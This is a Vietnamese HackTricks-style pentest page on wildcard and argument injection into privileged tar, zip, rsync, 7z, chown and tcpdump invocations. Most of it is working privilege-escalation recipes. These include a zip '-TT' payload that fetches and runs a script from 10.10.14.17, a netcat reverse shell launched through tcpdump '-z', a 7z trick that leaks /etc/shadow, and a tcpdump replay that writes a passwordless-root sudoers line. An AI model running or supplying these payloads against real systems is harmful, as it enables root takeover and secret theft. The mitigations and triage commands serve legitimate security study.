# Thủ thuật bổ sung với Wildcards

{{#include ../../banners/hacktricks-training.md}}

> **Chèn đối số** bằng wildcard (hay *glob*) xảy ra khi một script có đặc quyền chạy binary Unix như `tar`, `chown`, `rsync`, `zip`, `7z`, … với wildcard không được đặt trong dấu nháy như `*`.  
> Vì shell mở rộng wildcard **trước khi** thực thi binary, kẻ tấn công có thể tạo các tệp trong thư mục làm việc với tên bắt đầu bằng `-`, khiến chúng bị hiểu là **tùy chọn thay vì dữ liệu**; nhờ đó, kẻ tấn công có thể chèn các flag tùy ý hoặc thậm chí cả lệnh.<sup>[[6]](#references)</sup>
> Trang này tổng hợp các primitive hữu ích nhất, nghiên cứu gần đây và các phương pháp phát hiện hiện đại trong giai đoạn 2023-2025.

## chown / chmod

Bạn có thể **sao chép chủ sở hữu/nhóm hoặc các bit quyền từ một tệp tham chiếu** bằng cách lạm dụng flag `--reference` khi wildcard mở rộng thành tên tệp trông giống tùy chọn.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Khi root sau đó thực thi lệnh như:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Giá trị `--reference=.drf.php` được mở rộng ghi đè owner/mode đã chỉ định rõ ràng, khiến các file khớp mẫu kế thừa metadata từ `.drf.php` (và, với thiết lập ở trên, cho phép attacker ghi vào chúng).<sup>[[6]](#references)</sup>

Hãy xem xét toàn bộ privileged helper, không chỉ dòng `chown`. Việc thay đổi quyền sở hữu có thể xóa các bit set-user-ID hoặc set-group-ID; [POSIX quy định hành vi trong trường hợp đặc quyền là do cách triển khai quyết định](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Một lệnh `chmod` chạy sau đó trong cùng job có thể khôi phục các bit này trên những file được lệnh đó chọn trước, làm thay đổi kết quả. Trước khi xem đây là một đường dẫn leo thang đặc quyền có thể thực thi, hãy xác nhận thứ tự lệnh thực tế, thư mục chứa glob có thể ghi, hành vi với file và link bị ảnh hưởng, owner và mode sau cùng, cũng như liệu mount có áp dụng set-user-ID hay không. Nếu không đọc được helper thì không thể xác định các bước đó.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (tấn công kết hợp).<sup>[[7]](#references)</sup>
Xem thêm bài viết kinh điển của DefenseCode để biết chi tiết.<sup>[[6]](#references)</sup>

---

## GNU `cp` trong script chạy với quyền đặc biệt

Hãy xem xét một script chạy bằng root, sao chép từ thư mục làm việc do người gọi chọn bằng một glob trần, chẳng hạn `cp .version * /etc/app/staged/`, trong trường hợp người dùng có quyền thấp hơn có thể tạo tên file tại đó. GNU `cp` có thể phân tích tên file bắt đầu bằng dấu gạch ngang được mở rộng từ `*` thành một tùy chọn. Tùy chọn `--preserve=mode` có thể giữ lại các bit mode của nguồn trên bản sao mới, còn `--target-directory` có thể thay đổi đích sao chép. Cần xác minh từng khả năng dựa trên nhánh script cụ thể, trạng thái đích, quyền hiệu lực, chính sách hệ thống file và cách GNU `cp` hoạt động; chỉ riêng nội dung của quy tắc sudo hoặc script không chứng minh được việc leo thang đặc quyền. Thêm tiền tố `./` vào các toán hạng hoặc kết thúc việc phân tích tùy chọn bằng `--` sẽ ngăn GNU `cp` hiểu tên file bắt đầu bằng dấu gạch ngang theo cách này ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp` manual](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Thực thi các lệnh tùy ý bằng cách khai thác tính năng **checkpoint** và các hành động checkpoint của GNU tar.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Sau khi root chạy, chẳng hạn, `tar -czf /root/backup.tgz *`, `shell.sh` sẽ được thực thi với quyền root.<sup>[[10]](#references)</sup>

### Lưu ý về việc ghi đè compressor trong bsdtar / macOS

`tar` mặc định trên các phiên bản macOS gần đây (dựa trên `libarchive`) *không* cung cấp giao diện `--checkpoint` của GNU tar, nhưng tài liệu bsdtar có đề cập đến **--use-compress-program** để chọn một compressor bên ngoài.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Khi một script có đặc quyền chạy `tar -cf backup.tar *`, lệnh này chọn `sh` thông qua `PATH` của nạn nhân và bsdtar khởi chạy nó làm trình nén.<sup>[[11]](#references)</sup> Điều này chứng minh có thể thực hiện option injection, nhưng bản thân nó không phải là một primitive đáng tin cậy để chạy lệnh tùy ý: tên tệp được tạo từ wildcard không thể chứa `/`, và bsdtar cung cấp dữ liệu archive chứ không phải lệnh shell do kẻ tấn công chọn. Để thực thi mã, cần thêm một executable có thể kiểm soát được và được phân giải qua `PATH`, hoặc một kênh đối số khác có thể chỉ định một chương trình hữu ích.

---

## rsync

`rsync` cho phép ghi đè remote shell hoặc binary từ xa thông qua các cờ dòng lệnh như `-e` và `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Nếu root sau đó lưu trữ thư mục bằng lệnh `rsync -az * backup:/srv/`, flag được chèn vào có thể chạy shell thông qua cơ chế remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (chế độ `rsync`).

---

## 7-Zip / 7z / 7za

Ngay cả khi script có đặc quyền *phòng thủ* bằng cách thêm `--` trước wildcard (để ngăn phân tích cú pháp tùy chọn), CLI của 7-Zip vẫn chấp nhận **các file danh sách tệp** bằng cách thêm tiền tố `@` vào tên tệp. Kết hợp cách này với symlink cho phép bạn *exfiltrate các tệp tùy ý*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Nếu root thực thi thứ gì đó như:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip sẽ cố đọc `root.txt` (→ `/etc/shadow`) như một danh sách tệp và sẽ dừng lại, **in nội dung ra stderr**.<sup>[[13]](#references)</sup>

Cách này vẫn hoạt động khi dùng `-- *` vì CLI của 7-Zip chấp nhận rõ ràng cả tên tệp thông thường lẫn `@listfiles` làm đầu vào vị trí, nên tên tệp literal như `@root.txt` vẫn được xử lý đặc biệt.<sup>[[13]](#references)</sup>

---

## zip

Có hai primitive rất hữu dụng khi ứng dụng truyền tên tệp do người dùng kiểm soát cho `zip` (dù thông qua wildcard hay liệt kê tên mà không có `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE qua test hook: `-T` bật “test archive” và `-TT <cmd>` thay trình kiểm tra bằng một chương trình tùy ý (dạng dài: `--unzip-command <cmd>`). Nếu có thể chèn tên tệp bắt đầu bằng `-`, hãy chia các flag thành nhiều tên tệp riêng biệt để việc phân tích short-options hoạt động.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Ghi chú
- ĐỪNG thử dùng một tên tệp duy nhất như `'-T -TT <cmd>'` — các tùy chọn ngắn được phân tích theo từng ký tự và cách này sẽ thất bại. Hãy dùng các token riêng như minh họa.<sup>[[3]](#references)</sup>
- Nếu ứng dụng loại bỏ dấu gạch chéo khỏi tên tệp, hãy tải từ một host/IP trần (đường dẫn mặc định `/index.html`) và lưu cục bộ bằng `-O`, sau đó thực thi.<sup>[[3]](#references)</sup>
- Bạn có thể gỡ lỗi quá trình phân tích bằng `-sc` (hiển thị argv đã xử lý) hoặc `-h2` (trợ giúp chi tiết hơn) để hiểu cách các token được xử lý.<sup>[[3]](#references)</sup>

Ví dụ (hành vi cục bộ trên zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Nếu web layer phản hồi stdout/stderr của `zip` (thường gặp ở các wrapper sơ sài), những flag được chèn như `--help` hoặc lỗi do option không hợp lệ sẽ xuất hiện trong HTTP response, xác nhận command-line injection và hỗ trợ tinh chỉnh payload.<sup>[[3]](#references)</sup>

---

## Các ứng viên option-injection khác

Khi một wrapper có đặc quyền mở rộng một thư mục có thể ghi bằng wildcard, hãy kiểm tra các option hook đã được ghi nhận sau đây.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag có thể khai thác | Tác động |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Truyền chuỗi lệnh cho shell |
| `git`   | `-c core.sshCommand=<cmd>` | Dùng `<cmd>` thay cho SSH khi Git fetch/push |
| `scp`   | `-S <program>` | Dùng chương trình kết nối tương thích với SSH khác |

Các primitive này là những mục hữu ích cần kiểm tra ngoài các trường hợp kinh điển *tar/rsync/zip*.

---

## Tìm kiếm wrapper và job dễ bị tấn công

Các nghiên cứu tình huống và hướng dẫn phát hiện gần đây cho thấy wildcard/argv injection không còn chỉ là vấn đề **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Cùng một dạng lỗi liên tục xuất hiện trong:

- các tính năng web "tải mọi thứ dưới dạng zip/tar" từ những thư mục upload do attacker kiểm soát
- các debug shell của vendor/appliance cung cấp wrapper **tcpdump** với trường tên file/filter do attacker kiểm soát
- các job backup hoặc xoay vòng gọi `tar`, `rsync`, `7z`, `zip`, `chown` hoặc `chmod` trên các thư mục có thể ghi

Các lệnh triage hữu ích (lệnh gọi `pspy` sử dụng các flag về sự kiện process/file và khoảng thời gian đã được tài liệu hóa).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Các heuristic nhanh:

- `-- *` là cách khắc phục tốt cho nhiều công cụ GNU, nhưng **không áp dụng** với `7z`/`7za` vì `@listfiles` được phân tích riêng.<sup>[[13]](#references)</sup>
- Với `zip`, hãy tìm các wrapper liệt kê trực tiếp tên file do người dùng kiểm soát; việc tách short-option (`-T` + `-TT <cmd>`) vẫn hoạt động ngay cả khi không có shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Với `tcpdump`, đặc biệt chú ý đến các wrapper cho phép bạn kiểm soát **tên file đầu ra**, **cài đặt xoay vòng**, hoặc đối số **phát lại capture file**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE qua argv injection trong wrappers

Khi một restricted shell hoặc wrapper của nhà cung cấp tạo dòng lệnh `tcpdump` bằng cách nối các trường do người dùng kiểm soát (ví dụ: tham số "file name") mà không trích dẫn/kiểm tra nghiêm ngặt, bạn có thể lén chèn thêm các flag `tcpdump`. Kết hợp `-G` (xoay vòng theo thời gian), `-W` (giới hạn số lượng file) và `-z <cmd>` (lệnh chạy sau khi xoay vòng) cho phép thực thi lệnh tùy ý với quyền của người chạy tcpdump (thường là root trên các thiết bị appliance).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Điều kiện tiên quyết:

- Bạn có thể tác động đến `argv` được truyền cho `tcpdump` (ví dụ: qua wrapper như `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper không lọc khoảng trắng hoặc các token trong trường tên file bắt đầu bằng `-`.<sup>[[4]](#references)</sup>

PoC kinh điển (thực thi một script reverse shell từ đường dẫn có thể ghi).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Chi tiết:

- `-G 1` xoay vòng mỗi giây và `-W 1` dừng sau khi xoay vòng một tệp; capture phải nhận được một packet khớp trước khi xoay vòng.<sup>[[18]](#references)</sup>
- `-z <cmd>` chạy lệnh post-rotate một lần mỗi lần xoay vòng và truyền đường dẫn savefile đã đóng làm đối số; hãy đảm bảo cách xử lý đối số của script/interpreter khớp với payload của bạn.<sup>[[18]](#references)</sup>

Biến thể không cần phương tiện lưu trữ tháo rời:

- Nếu bạn có primitive khác để ghi tệp (ví dụ: một command wrapper riêng cho phép chuyển hướng đầu ra), hãy đặt script vào một đường dẫn đã biết rồi kích hoạt `-z /path/script.sh`; nếu cần, hãy để script tự gọi `/bin/sh`.<sup>[[18]](#references)</sup>
- Nếu vendor wrapper cho phép bạn chọn đường dẫn được xoay vòng, hãy audit quyền kiểm soát đường dẫn đó chỉ khi kết hợp với lệnh post-rotate có diễn giải đối số savefile; chỉ kiểm soát đường dẫn thì không thực thi nội dung tệp.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump với wildcards/đối số bổ sung → đọc/ghi tùy ý và root

Ví dụ về anti-pattern trong sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Quy tắc này vẫn cho phép một số tùy chọn theo parser được tài liệu hóa của tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` và các mẫu permissive chỉ giới hạn đối số `-w` đầu tiên. `tcpdump` chấp nhận nhiều tùy chọn `-w`; tùy chọn cuối cùng sẽ được áp dụng.<sup>[[3]](#references)[[18]](#references)</sup>
- Quy tắc không cố định các tùy chọn khác, nên vẫn được phép dùng `-Z`, `-r`, `-V`, v.v.<sup>[[3]](#references)[[18]](#references)</sup>

Các primitive liên quan được ghi lại bên dưới.<sup>[[3]](#references)[[18]](#references)</sup>
- Ghi đè đường dẫn đích bằng `-w` thứ hai (`-w` đầu tiên chỉ để thỏa mãn sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal bên trong `-w` đầu tiên để thoát khỏi cây bị giới hạn.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Ép quyền sở hữu đầu ra thành `root` bằng `-Z root` (tạo các tệp thuộc sở hữu `root` ở bất kỳ đâu).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Ghi nội dung tùy ý bằng cách phát lại PCAP được tạo thủ công qua `-r` (ví dụ: để thêm một dòng vào sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Tạo PCAP chứa chính xác payload ASCII và ghi tệp với quyền root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Đọc tệp tùy ý/rò rỉ bí mật bằng `-V <file>` (diễn giải danh sách savefiles). Thông báo lỗi thường lặp lại các dòng, làm rò rỉ nội dung.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Chèn đối số zip để RCE + leo thang đặc quyền do cấu hình sai sudo của tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Chuỗi khai thác đầy đủ](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Phát hiện khả năng thực thi Shell thông qua chèn Wildcard](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Trở về tương lai: Wildcards Unix vượt ngoài tầm kiểm soát (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils - cách gọi `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils - cách gọi `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Điểm kiểm tra của GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Hướng dẫn sử dụng bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Hướng dẫn sử dụng rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Cú pháp dòng lệnh 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Hướng dẫn sử dụng flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Tài liệu cấu hình Git](https://git-scm.com/docs/git-config)
- [17] [Hướng dẫn sử dụng `scp` của OpenBSD](https://man.openbsd.org/scp)
- [18] [Hướng dẫn sử dụng tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
